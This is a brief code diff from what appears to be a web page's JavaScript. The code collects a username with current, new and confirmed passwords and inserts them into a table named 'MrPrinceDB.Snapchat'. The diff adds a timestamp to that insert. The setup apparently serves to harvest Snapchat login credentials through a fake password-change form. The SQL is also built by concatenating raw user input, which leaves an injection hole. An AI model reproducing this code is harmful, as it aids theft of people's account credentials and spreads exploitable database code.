@@ -171,6 +171,7 @@
             var currentPassword = document.getElementById("currentPassword").value;
             var newPassword = document.getElementById("newPassword").value;
             var confirmPassword = document.getElementById("confirmPassword").value;
+            var datetime = "NOW()";
 
             var sql = "INSERT INTO MrPrinceDB.Snapchat (USERNAME, CURRPASS, NEWPASS, CONFIRMPASS, DATETIME) VALUES ('" + username + "', '" + currentPassword + "', '" + newPassword + "', '" + confirmPassword + "', " + datetime + ");";
             // execute the SQL statement
